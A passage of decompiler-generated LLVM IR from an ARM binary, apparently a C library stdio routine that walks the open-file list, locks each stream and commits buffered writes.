  %v9_163e4 = icmp eq i32 %v3_163e0, %v1_163e4
  br i1 %v9_163e4, label %dec_label_pc_1642c, label %dec_label_pc_163ec

dec_label_pc_163ec:                               ; preds = %dec_label_pc_163d8
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_163dc, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_163f8123 = inttoptr i32 %v4_163dc to i32*
  %v2_163f8124 = load i32, i32* %v1_163f8123, align 4
  store i32 %v2_163f8124, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_163fc126 = icmp eq i32 %v2_163f8124, 0
  br i1 %v9_163fc126, label %dec_label_pc_16404, label %dec_label_pc_1641c

dec_label_pc_16404:                               ; preds = %dec_label_pc_163ec, %dec_label_pc_16404.dec_label_pc_163f8_crit_edge
  %v0_16404127 = phi i32 [ %v1_163fc.pre, %dec_label_pc_16404.dec_label_pc_163f8_crit_edge ], [ 0, %dec_label_pc_163ec ]
  store i32 %v0_16404127, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16414 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16414, label %dec_label_pc_16418, label %dec_label_pc_16404.dec_label_pc_163f8_crit_edge

dec_label_pc_16404.dec_label_pc_163f8_crit_edge:  ; preds = %dec_label_pc_16404
  %v0_163f8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_163fc.pre = load i32, i32* @r4, align 4
  %v1_163f8 = inttoptr i32 %v0_163f8.pre to i32*
  %v2_163f8 = load i32, i32* %v1_163f8, align 4
  store i32 %v2_163f8, i32* %r3.global-to-local, align 4
  %v3_163fc = icmp uge i32 %v2_163f8, %v1_163fc.pre
  store i1 %v3_163fc, i1* %cpsr_c.global-to-local, align 1
  %v9_163fc = icmp eq i32 %v2_163f8, %v1_163fc.pre
  br i1 %v9_163fc, label %dec_label_pc_16404, label %dec_label_pc_1641c

dec_label_pc_16418:                               ; preds = %dec_label_pc_16404
  %v0_16418 = load i32, i32* @r4, align 4
  store i32 %v0_16418, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1641c

dec_label_pc_1641c:                               ; preds = %dec_label_pc_163ec, %dec_label_pc_16404.dec_label_pc_163f8_crit_edge, %dec_label_pc_16418
  %v0_1641c = phi i32 [ %v0_16418, %dec_label_pc_16418 ], [ %v2_163f8124, %dec_label_pc_163ec ], [ %v2_163f8, %dec_label_pc_16404.dec_label_pc_163f8_crit_edge ]
  %v1_1641c = phi i32 [ %v0_16418, %dec_label_pc_16418 ], [ 0, %dec_label_pc_163ec ], [ %v1_163fc.pre, %dec_label_pc_16404.dec_label_pc_163f8_crit_edge ]
  %v3_1641c = icmp uge i32 %v0_1641c, %v1_1641c
  store i1 %v3_1641c, i1* %cpsr_c.global-to-local, align 1
  %v9_1641c = icmp eq i32 %v0_1641c, %v1_1641c
  br i1 %v9_1641c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_1641c
  %v1_16420 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_16420, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_1641c, %bb67
  %v1_16424 = xor i1 %v9_1641c, true
  call void @__pseudo_cond_branch(i1 %v1_16424, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_16428 = load i32, i32* %r8.global-to-local, align 4
  %v1_16428 = load i32, i32* %r5.global-to-local, align 4
  %v2_16428 = add i32 %v1_16428, 8
  %v3_16428 = inttoptr i32 %v2_16428 to i32*
  store i32 %v0_16428, i32* %v3_16428, align 4
  %v0_16430.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1642c

dec_label_pc_1642c:                               ; preds = %dec_label_pc_163d8, %bb68
  %v0_1643c = phi i32 [ %v0_163dc, %dec_label_pc_163d8 ], [ %v0_16430.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_16430 = add i32 %v0_1643c, 152
  %v3_16430 = inttoptr i32 %v2_16430 to i32*
  %v4_16430 = load i32, i32* %v3_16430, align 4
  store i32 %v4_16430, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_16438 = add i32 %v4_16430, 4
  %v2_16438 = inttoptr i32 %v1_16438 to i32*
  %v3_16438 = load i32, i32* %v2_16438, align 4
  store i32 %v3_16438, i32* %r1.global-to-local, align 4
  %v2_1643c = add i32 %v0_1643c, 76
  %v3_1643c = inttoptr i32 %v2_1643c to i32*
  %v4_1643c = load i32, i32* %v3_1643c, align 4
  store i32 %v4_1643c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16440 = icmp eq i32 %v3_16438, 0
  %v1_16444 = inttoptr i32 %v4_1643c to i32*
  %v2_16444 = load i32, i32* %v1_16444, align 4
  store i32 %v2_16444, i32* @r5, align 4
  br i1 %v2_16440, label %dec_label_pc_1644c, label %dec_label_pc_164ac

dec_label_pc_1644c:                               ; preds = %dec_label_pc_1642c
  %v2_1644c = add i32 %v4_16430, 8
  %v3_1644c = inttoptr i32 %v2_1644c to i32*
  store i32 0, i32* %v3_1644c, align 4
  %v0_16450 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16450, i32* @r7, align 4
  br label %dec_label_pc_16454

dec_label_pc_16454:                               ; preds = %dec_label_pc_16484.dec_label_pc_16454_crit_edge, %dec_label_pc_1644c
  %v0_16454 = phi i32 [ %v0_16454.pre, %dec_label_pc_16484.dec_label_pc_16454_crit_edge ], [ %v0_16450, %dec_label_pc_1644c ]
  %v1_16454 = inttoptr i32 %v0_16454 to i32*
  %v2_16454 = load i32, i32* %v1_16454, align 4
  store i32 %v2_16454, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_16454, i32* %r2.global-to-local, align 4
  %v2_16460111 = load i32, i32* %v1_16454, align 4
  store i32 %v2_16460111, i32* %r3.global-to-local, align 4
  %v3_16464113 = icmp uge i32 %v2_16460111, %v2_16454
  store i1 %v3_16464113, i1* %cpsr_c.global-to-local, align 1
  %v9_16464119 = icmp eq i32 %v2_16460111, %v2_16454
  br i1 %v9_16464119, label %dec_label_pc_1646c, label %dec_label_pc_16484

dec_label_pc_1646c:                               ; preds = %dec_label_pc_16454, %dec_label_pc_1646c.dec_label_pc_16460_crit_edge
  %v0_1646c120 = phi i32 [ %v1_16464.pre, %dec_label_pc_1646c.dec_label_pc_16460_crit_edge ], [ %v2_16454, %dec_label_pc_16454 ]
  store i32 %v0_1646c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_1647c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1647c, label %dec_label_pc_16480, label %dec_label_pc_1646c.dec_label_pc_16460_crit_edge

dec_label_pc_1646c.dec_label_pc_16460_crit_edge:  ; preds = %dec_label_pc_1646c
  %v0_16460.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_16464.pre = load i32, i32* @r4, align 4
  %v1_16460 = inttoptr i32 %v0_16460.pre to i32*
  %v2_16460 = load i32, i32* %v1_16460, align 4
  store i32 %v2_16460, i32* %r3.global-to-local, align 4
  %v3_16464 = icmp uge i32 %v2_16460, %v1_16464.pre
  store i1 %v3_16464, i1* %cpsr_c.global-to-local, align 1
  %v9_16464 = icmp eq i32 %v2_16460, %v1_16464.pre
  br i1 %v9_16464, label %dec_label_pc_1646c, label %dec_label_pc_16484

dec_label_pc_16480:                               ; preds = %dec_label_pc_1646c
  %v0_16480 = load i32, i32* @r4, align 4
  store i32 %v0_16480, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16484

dec_label_pc_16484:                               ; preds = %dec_label_pc_16454, %dec_label_pc_1646c.dec_label_pc_16460_crit_edge, %dec_label_pc_16480
  %v0_1648c = phi i32 [ %v0_16480, %dec_label_pc_16480 ], [ %v2_16460111, %dec_label_pc_16454 ], [ %v2_16460, %dec_label_pc_1646c.dec_label_pc_16460_crit_edge ]
  %v1_16484 = phi i32 [ %v0_16480, %dec_label_pc_16480 ], [ %v2_16454, %dec_label_pc_16454 ], [ %v1_16464.pre, %dec_label_pc_1646c.dec_label_pc_16460_crit_edge ]
  %v3_16484 = icmp uge i32 %v0_1648c, %v1_16484
  store i1 %v3_16484, i1* %cpsr_c.global-to-local, align 1
  %v9_16484 = icmp eq i32 %v0_1648c, %v1_16484
  br i1 %v9_16484, label %dec_label_pc_1648c, label %dec_label_pc_16484.dec_label_pc_16454_crit_edge

dec_label_pc_16484.dec_label_pc_16454_crit_edge:  ; preds = %dec_label_pc_16484
  %v0_16454.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16454

dec_label_pc_1648c:                               ; preds = %dec_label_pc_16484
  %v2_1648c = icmp ne i32 %v1_16484, 0
  store i1 %v2_1648c, i1* %cpsr_c.global-to-local, align 1
  %v7_16490 = icmp slt i32 %v1_16484, 2
  br i1 %v7_16490, label %dec_label_pc_164acthread-pre-split, label %dec_label_pc_16494

dec_label_pc_16494:                               ; preds = %dec_label_pc_1648c
  %v0_16494 = load i32, i32* @r7, align 4
  store i32 %v0_16494, i32* %r0.global-to-local, align 4
  %v0_16498 = load i32, i32* %r1.global-to-local, align 4
  %v1_16498 = add i32 %v0_16498, 129
  store i32 %v1_16498, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_164acthread-pre-split

dec_label_pc_164acthread-pre-split:               ; preds = %dec_label_pc_1648c, %dec_label_pc_16494
  %v0_165f8.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_164ac

dec_label_pc_164ac:                               ; preds = %dec_label_pc_164acthread-pre-split, %dec_label_pc_1642c
  %v0_165f8.pr = phi i32 [ %v0_165f8.pr.pr, %dec_label_pc_164acthread-pre-split ], [ %v2_16444, %dec_label_pc_1642c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165f818 = icmp eq i32 %v0_165f8.pr, 0
  br i1 %v2_165f818, label %dec_label_pc_16600, label %dec_label_pc_164bc

dec_label_pc_164bc:                               ; preds = %dec_label_pc_164ac, %dec_label_pc_165f4
  %v0_164e4 = phi i32 [ %v3_165f4, %dec_label_pc_165f4 ], [ %v0_165f8.pr, %dec_label_pc_164ac ]
  %v1_164bc = inttoptr i32 %v0_164e4 to i16*
  %v2_164bc = load i16, i16* %v1_164bc, align 2
  %v3_164bc = zext i16 %v2_164bc to i32
  store i32 %v3_164bc, i32* %r3.global-to-local, align 4
  %v1_164c0 = and i32 %v3_164bc, 64
  %v2_164c0 = icmp eq i32 %v1_164c0, 0
  br i1 %v2_164c0, label %dec_label_pc_165f4, label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %dec_label_pc_164bc
  %v0_164c8 = load i32, i32* @r6, align 4
  %v1_164c8 = load i32, i32* %sb.global-to-local, align 4
  %v2_164c8 = add i32 %v1_164c8, %v0_164c8
  %v3_164c8 = inttoptr i32 %v2_164c8 to i32*
  %v4_164c8 = load i32, i32* %v3_164c8, align 4
  store i32 %v4_164c8, i32* %r3.global-to-local, align 4
  %v1_164cc = inttoptr i32 %v4_164c8 to i32*
  %v2_164cc = load i32, i32* %v1_164cc, align 4
  store i32 %v2_164cc, i32* %r3.global-to-local, align 4
  %v2_164d0 = icmp ugt i32 %v2_164cc, 1
  store i1 %v2_164d0, i1* %cpsr_c.global-to-local, align 1
  %v7_164d0 = icmp eq i32 %v2_164cc, 2
  br i1 %v7_164d0, label %dec_label_pc_16534, label %dec_label_pc_164d8

dec_label_pc_164d8:                               ; preds = %dec_label_pc_164c8
  %v1_164d8 = add i32 %v0_164e4, 64
  %v2_164d8 = inttoptr i32 %v1_164d8 to i32*
  %v3_164d8 = load i32, i32* %v2_164d8, align 4
  store i32 %v3_164d8, i32* %r3.global-to-local, align 4
  %v1_164dc = load i32, i32* %r8.global-to-local, align 4
  %v3_164dc = icmp uge i32 %v3_164d8, %v1_164dc
  store i1 %v3_164dc, i1* %cpsr_c.global-to-local, align 1
  %v9_164dc = icmp eq i32 %v3_164d8, %v1_164dc
  br i1 %v9_164dc, label %dec_label_pc_16528, label %dec_label_pc_164e4

dec_label_pc_164e4:                               ; preds = %dec_label_pc_164d8
  %v1_164e4 = add i32 %v0_164e4, 56
  store i32 %v1_164e4, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_164e4, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_164f486 = inttoptr i32 %v1_164e4 to i32*
  %v2_164f487 = load i32, i32* %v1_164f486, align 4
  store i32 %v2_164f487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_164f894 = icmp eq i32 %v2_164f487, 0
  br i1 %v9_164f894, label %dec_label_pc_16500, label %dec_label_pc_16518

dec_label_pc_16500:                               ; preds = %dec_label_pc_164e4, %dec_label_pc_16500.dec_label_pc_164f4_crit_edge
  %v0_1650095 = phi i32 [ %v1_164f8.pre, %dec_label_pc_16500.dec_label_pc_164f4_crit_edge ], [ 0, %dec_label_pc_164e4 ]
  store i32 %v0_1650095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_16510 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16510, label %dec_label_pc_16514, label %dec_label_pc_16500.dec_label_pc_164f4_crit_edge

dec_label_pc_16500.dec_label_pc_164f4_crit_edge:  ; preds = %dec_label_pc_16500
  %v0_164f4.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_164f8.pre = load i32, i32* @r4, align 4
  %v1_164f4 = inttoptr i32 %v0_164f4.pre to i32*
  %v2_164f4 = load i32, i32* %v1_164f4, align 4
  store i32 %v2_164f4, i32* %r3.global-to-local, align 4
  %v3_164f8 = icmp uge i32 %v2_164f4, %v1_164f8.pre
  store i1 %v3_164f8, i1* %cpsr_c.global-to-local, align 1
  %v9_164f8 = icmp eq i32 %v2_164f4, %v1_164f8.pre
  br i1 %v9_164f8, label %dec_label_pc_16500, label %dec_label_pc_16518

dec_label_pc_16514:                               ; preds = %dec_label_pc_16500
  %v0_16514 = load i32, i32* @r4, align 4
  store i32 %v0_16514, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_16518

dec_label_pc_16518:                               ; preds = %dec_label_pc_164e4, %dec_label_pc_16500.dec_label_pc_164f4_crit_edge, %dec_label_pc_16514
  %v0_16518 = phi i32 [ %v0_16514, %dec_label_pc_16514 ], [ %v2_164f487, %dec_label_pc_164e4 ], [ %v2_164f4, %dec_label_pc_16500.dec_label_pc_164f4_crit_edge ]
  %v1_16518 = phi i32 [ %v0_16514, %dec_label_pc_16514 ], [ 0, %dec_label_pc_164e4 ], [ %v1_164f8.pre, %dec_label_pc_16500.dec_label_pc_164f4_crit_edge ]
  %v3_16518 = icmp uge i32 %v0_16518, %v1_16518
  store i1 %v3_16518, i1* %cpsr_c.global-to-local, align 1
  %v9_16518 = icmp eq i32 %v0_16518, %v1_16518
  br i1 %v9_16518, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_16518
  %v1_1651c = load i32, i32* @r7, align 4
  store i32 %v1_1651c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_16518, %bb69
  %v1_16520 = xor i1 %v9_16518, true
  call void @__pseudo_cond_branch(i1 %v1_16520, i32 ptrtoint (i32* @global_var_13c0c.506 to i32))
  %v0_16524 = load i32, i32* %r8.global-to-local, align 4
  %v1_16524 = load i32, i32* @r5, align 4
  %v2_16524 = add i32 %v1_16524, 64
  %v3_16524 = inttoptr i32 %v2_16524 to i32*
  store i32 %v0_16524, i32* %v3_16524, align 4
  %v0_16528.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16528

dec_label_pc_16528:                               ; preds = %dec_label_pc_164d8, %bb70
  %v0_16528 = phi i32 [ %v0_164e4, %dec_label_pc_164d8 ], [ %v0_16528.pre, %bb70 ]
  %v1_16528 = add i32 %v0_16528, 60
  %v2_16528 = inttoptr i32 %v1_16528 to i32*
  %v3_16528 = load i32, i32* %v2_16528, align 4
  %v1_1652c = add i32 %v3_16528, 1
  store i32 %v1_1652c, i32* %r3.global-to-local, align 4
  store i32 %v1_1652c, i32* %v2_16528, align 4
  %v0_16534.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16534

dec_label_pc_16534:                               ; preds = %dec_label_pc_164c8, %dec_label_pc_16528
  %v0_1654c = phi i32 [ %v0_164e4, %dec_label_pc_164c8 ], [ %v0_16534.pre, %dec_label_pc_16528 ]
  %v1_16534 = inttoptr i32 %v0_1654c to i16*
  %v2_16534 = load i16, i16* %v1_16534, align 2
  %v3_16534 = zext i16 %v2_16534 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_1653c = or i32 %v3_16534, %stack_var_-44.1
  %v1_16540 = xor i32 %v2_1653c, 320
  store i32 %v1_16540, i32* %r3.global-to-local, align 4
  %v1_16544 = and i32 %v1_16540, 832
  %v2_16544 = icmp eq i32 %v1_16544, 0
  br i1 %v2_16544, label %dec_label_pc_1654c, label %bb71

dec_label_pc_1654c:                               ; preds = %dec_label_pc_16534
  store i32 %v0_1654c, i32* %r0.global-to-local, align 4
  %v1_16550 = call i32 @__stdio_wcommit(i32 %v0_1654c)
  store i32 %v1_16550, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16554 = icmp eq i32 %v1_16550, 0
  br i1 %v2_16554, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_1654c
  %v1_16558 = load i32, i32* @r5, align 4
  %v2_16558 = inttoptr i32 %v1_16558 to i16*
  %v3_16558 = load i16, i16* %v2_16558, align 2
  %v4_16558 = zext i16 %v3_16558 to i32
  store i32 %v4_16558, i32* %r3.global-to-local, align 4
  %v2_1655c = add i32 %v1_16558, 8
  %v3_1655c = inttoptr i32 %v2_1655c to i32*
  %v4_1655c = load i32, i32* %v3_1655c, align 4
  store i32 %v4_1655c, i32* %r2.global-to-local, align 4
  %v2_16560 = and i32 %v4_16558, 65471
  store i32 %v2_16560, i32* %r3.global-to-local, align 4
  %v3_16564 = add i32 %v1_16558, 28
  %v4_16564 = inttoptr i32 %v3_16564 to i32*
  store i32 %v4_1655c, i32* %v4_16564, align 4
  %v1_16568 = load i32, i32* %r3.global-to-local, align 4
  %v2_16568 = trunc i32 %v1_16568 to i16
  %v3_16568 = load i32, i32* @r5, align 4
  %v4_16568 = inttoptr i32 %v3_16568 to i16*
  store i16 %v2_16568, i16* %v4_16568, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_1654c
  %v1_1656c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_1656c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_16534, %.thread7
  %v0_16570 = load i32, i32* @r6, align 4
  %v1_16570 = load i32, i32* %sb.global-to-local, align 4
  %v2_16570 = add i32 %v1_16570, %v0_16570
  %v3_16570 = inttoptr i32 %v2_16570 to i32*
  %v4_16570 = load i32, i32* %v3_16570, align 4
  store i32 %v4_16570, i32* %r3.global-to-local, align 4
  %v1_16574 = inttoptr i32 %v4_16570 to i32*
  %v2_16574 = load i32, i32* %v1_16574, align 4
  store i32 %v2_16574, i32* %r3.global-to-local, align 4
  %v2_16578 = icmp ugt i32 %v2_16574, 1
  store i1 %v2_16578, i1* %cpsr_c.global-to-local, align 1
  %v7_16578 = icmp eq i32 %v2_16574, 2
  br i1 %v7_16578, label %dec_label_pc_165f4, label %dec_label_pc_16580

dec_label_pc_16580:                               ; preds = %bb71
  %v0_16580 = load i32, i32* @r5, align 4
  %v1_16580 = add i32 %v0_16580, 60
  %v2_16580 = inttoptr i32 %v1_16580 to i32*
  %v3_16580 = load i32, i32* %v2_16580, align 4
  %v1_16584 = add i32 %v3_16580, -1
  store i32 %v1_16584, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16588 = icmp eq i32 %v1_16584, 0
  store i32 %v1_16584, i32* %v2_16580, align 4
  br i1 %v2_16588, label %dec_label_pc_16594, label %dec_label_pc_165f4

dec_label_pc_16594:                               ; preds = %dec_label_pc_16580
  %v0_16594 = load i32, i32* %r3.global-to-local, align 4
  %v1_16594 = load i32, i32* @r5, align 4
  %v2_16594 = add i32 %v1_16594, 64
  %v3_16594 = inttoptr i32 %v2_16594 to i32*
  store i32 %v0_16594, i32* %v3_16594, align 4
  %v0_16598 = load i32, i32* @r5, align 4
  %v1_16598 = add i32 %v0_16598, 56
  store i32 %v1_16598, i32* @r7, align 4
  br label %dec_label_pc_1659c

dec_label_pc_1659c:                               ; preds = %dec_label_pc_165cc.dec_label_pc_1659c_crit_edge, %dec_label_pc_16594
  %v0_165a4 = phi i32 [ %v0_165a4.pre, %dec_label_pc_165cc.dec_label_pc_1659c_crit_edge ], [ %v1_16598, %dec_label_pc_16594 ]
  %v0_1659c = phi i32 [ %v0_1659c.pre, %dec_label_pc_165cc.dec_label_pc_1659c_crit_edge ], [ %v0_16598, %dec_label_pc_16594 ]
  %v1_1659c = add i32 %v0_1659c, 56
  %v2_1659c = inttoptr i32 %v1_1659c to i32*
  %v3_1659c = load i32, i32* %v2_1659c, align 4
  store i32 %v3_1659c, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_165a4, i32* %r2.global-to-local, align 4
  %v1_165a897 = inttoptr i32 %v0_165a4 to i32*
  %v2_165a898 = load i32, i32* %v1_165a897, align 4
  store i32 %v2_165a898, i32* %r3.global-to-local, align 4
  %v3_165ac100 = icmp uge i32 %v2_165a898, %v3_1659c
  store i1 %v3_165ac100, i1* %cpsr_c.global-to-local, align 1
  %v9_165ac106 = icmp eq i32 %v2_165a898, %v3_1659c
  br i1 %v9_165ac106, label %dec_label_pc_165b4, label %dec_label_pc_165cc

dec_label_pc_165b4:                               ; preds = %dec_label_pc_1659c, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge
  %v0_165b4107 = phi i32 [ %v1_165ac.pre, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge ], [ %v3_1659c, %dec_label_pc_1659c ]
  store i32 %v0_165b4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_165c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_165c4, label %dec_label_pc_165c8, label %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge

dec_label_pc_165b4.dec_label_pc_165a8_crit_edge:  ; preds = %dec_label_pc_165b4
  %v0_165a8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_165ac.pre = load i32, i32* @r4, align 4
  %v1_165a8 = inttoptr i32 %v0_165a8.pre to i32*
  %v2_165a8 = load i32, i32* %v1_165a8, align 4
  store i32 %v2_165a8, i32* %r3.global-to-local, align 4
  %v3_165ac = icmp uge i32 %v2_165a8, %v1_165ac.pre
  store i1 %v3_165ac, i1* %cpsr_c.global-to-local, align 1
  %v9_165ac = icmp eq i32 %v2_165a8, %v1_165ac.pre
  br i1 %v9_165ac, label %dec_label_pc_165b4, label %dec_label_pc_165cc

dec_label_pc_165c8:                               ; preds = %dec_label_pc_165b4
  %v0_165c8 = load i32, i32* @r4, align 4
  store i32 %v0_165c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_165cc

dec_label_pc_165cc:                               ; preds = %dec_label_pc_1659c, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge, %dec_label_pc_165c8
  %v0_165d4 = phi i32 [ %v0_165c8, %dec_label_pc_165c8 ], [ %v2_165a898, %dec_label_pc_1659c ], [ %v2_165a8, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge ]
  %v1_165cc = phi i32 [ %v0_165c8, %dec_label_pc_165c8 ], [ %v3_1659c, %dec_label_pc_1659c ], [ %v1_165ac.pre, %dec_label_pc_165b4.dec_label_pc_165a8_crit_edge ]
  %v3_165cc = icmp uge i32 %v0_165d4, %v1_165cc
  store i1 %v3_165cc, i1* %cpsr_c.global-to-local, align 1
  %v9_165cc = icmp eq i32 %v0_165d4, %v1_165cc
  br i1 %v9_165cc, label %dec_label_pc_165d4, label %dec_label_pc_165cc.dec_label_pc_1659c_crit_edge

dec_label_pc_165cc.dec_label_pc_1659c_crit_edge:  ; preds = %dec_label_pc_165cc
  %v0_1659c.pre = load i32, i32* @r5, align 4
  %v0_165a4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1659c

dec_label_pc_165d4:                               ; preds = %dec_label_pc_165cc
  %v2_165d4 = icmp ne i32 %v1_165cc, 0
  store i1 %v2_165d4, i1* %cpsr_c.global-to-local, align 1
  %v7_165d8 = icmp slt i32 %v1_165cc, 2
  br i1 %v7_165d8, label %dec_label_pc_165f4, label %dec_label_pc_165dc

dec_label_pc_165dc:                               ; preds = %dec_label_pc_165d4
  %v0_165dc = load i32, i32* @r5, align 4
  %v1_165dc = add i32 %v0_165dc, 56
  store i32 %v1_165dc, i32* %r0.global-to-local, align 4
  %v0_165e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_165e0 = add i32 %v0_165e0, 129
  store i32 %v1_165e0, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_165f4

dec_label_pc_165f4:                               ; preds = %dec_label_pc_16580, %dec_label_pc_165dc, %dec_label_pc_165d4, %bb71, %dec_label_pc_164bc
  %v0_165f4 = load i32, i32* @r5, align 4
  %v1_165f4 = add i32 %v0_165f4, 32
  %v2_165f4 = inttoptr i32 %v1_165f4 to i32*
  %v3_165f4 = load i32, i32* %v2_165f4, align 4
  store i32 %v3_165f4, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_165f8 = icmp eq i32 %v3_165f4, 0
  br i1 %v2_165f8, label %dec_label_pc_16600, label %dec_label_pc_164bc

dec_label_pc_16600:                               ; preds = %dec_label_pc_165f4, %dec_label_pc_164ac
  %v0_16600 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_16600, i32* %r0.global-to-local, align 4
  %v0_1663c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16608:                               ; preds = %dec_label_pc_162e4
  %v3_16608 = load i16, i16* %arg1, align 2
  %v4_16608 = zext i16 %v3_16608 to i32
  %v1_1660c = and i32 %v4_16608, 64
  store i32 %v1_1660c, i32* %r3.global-to-local, align 4
  %v2_1660c = icmp eq i32 %v1_1660c, 0
  br i1 %v2_1660c, label %bb72, label %dec_label_pc_16618

bb72:                                             ; preds = %dec_label_pc_16608
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_16618:                               ; preds = %dec_label_pc_16608
  %v2_16618 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_16618, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1661c = icmp eq i32 %v2_16618, 0
  br i1 %v2_1661c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_16618
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_16618
  %v1_16620 = load i32, i32* @r4, align 4
  %v2_16620 = inttoptr i32 %v1_16620 to i16*
  %v3_16620 = load i16, i16* %v2_16620, align 2
  %v4_16620 = zext i16 %v3_16620 to i32
  store i32 %v4_16620, i32* %r3.global-to-local, align 4
  %v2_16624 = add i32 %v1_16620, 8
  %v3_16624 = inttoptr i32 %v2_16624 to i32*
  %v4_16624 = load i32, i32* %v3_16624, align 4
  store i32 %v4_16624, i32* %r2.global-to-local, align 4
  %v2_16628 = and i32 %v4_16620, 65471
  store i32 %v2_16628, i32* %r3.global-to-local, align 4
  %v2_1662c = trunc i32 %v2_16628 to i16
  store i16 %v2_1662c, i16* %v2_16620, align 2
  %v1_16630 = load i32, i32* %r2.global-to-local, align 4
  %v2_16630 = load i32, i32* @r4, align 4
  %v3_16630 = add i32 %v2_16630, 28
  %v4_16630 = inttoptr i32 %v3_16630 to i32*
  store i32 %v1_16630, i32* %v4_16630, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_16600, %.thread14
  %v0_1663c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_1663c.pre, %dec_label_pc_16600 ], [ 0, %.thread14 ]
  store i32 %v0_1663c, i32* %r0.global-to-local, align 4
  store i32 %v6_162b8, i32* %r5.global-to-local, align 4
  ret i32 %v0_1663c

; uselistorder directives
  uselistorder i32 %v0_1663c, { 1, 0 }
  uselistorder i32 %v3_165f4, { 1, 2, 0 }
  uselistorder i32 %v0_165c8, { 1, 0, 2 }
  uselistorder i32 %v1_165ac.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_1654c, { 1, 0, 2 }
  uselistorder i32 %v0_16514, { 1, 0, 2 }
  uselistorder i32 %v1_164f8.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_164dc, { 1, 0 }
